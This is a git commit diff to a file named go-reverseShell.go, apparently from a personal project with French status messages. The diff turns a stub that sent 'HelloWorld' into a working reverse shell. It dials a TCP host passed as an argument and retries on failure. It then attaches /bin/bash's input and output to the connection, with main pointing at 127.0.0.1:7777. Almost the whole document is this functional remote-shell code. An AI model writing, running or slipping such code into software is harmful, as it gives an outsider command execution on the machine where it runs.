e369fcecfab356c28012c0c5d8e073bc93b44bf2
astalios <37106010+Astalios@users.noreply.github.com>
2022-10-18 12:52:13 +0200

    cleaning before comments

--- src/go-reverseShell.go
+++ src/go-reverseShell.go
@@ -4,20 +4,36 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
+	"time"
 )
 
-func shell( /*host string*/ ) {
+func shell(host string) {
 
-	conn, err := net.Dial("tcp", "127.0.0.1:7777")
+	conn, err := net.Dial("tcp", host)
 	if err != nil {
-		fmt.Println("erreur de connexion a l'hote")
+		if nil != conn {
+			conn.Close()
+		}
+		for i := 1; i <= 5; i++ {
+			fmt.Println("ERREUR - Connexion a l'hote impossible")
+			time.Sleep(5 * time.Second)
+			shell(host)
+		}
+		fmt.Println("ECHEC - Connexion a l'hote impossible")
 		os.Exit(1)
 	}
-	fmt.Fprintf(conn, "HelloWorld")
+	fmt.Println("Connexion Reussie")
+	sh := exec.Command("/bin/bash")
+	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
+	sh.Run()
+	conn.Close()
+	fmt.Println("Connexion Fermee")
+
 }
 
 func main() {
 
-	shell()
+	shell("127.0.0.1:7777")
 
 }
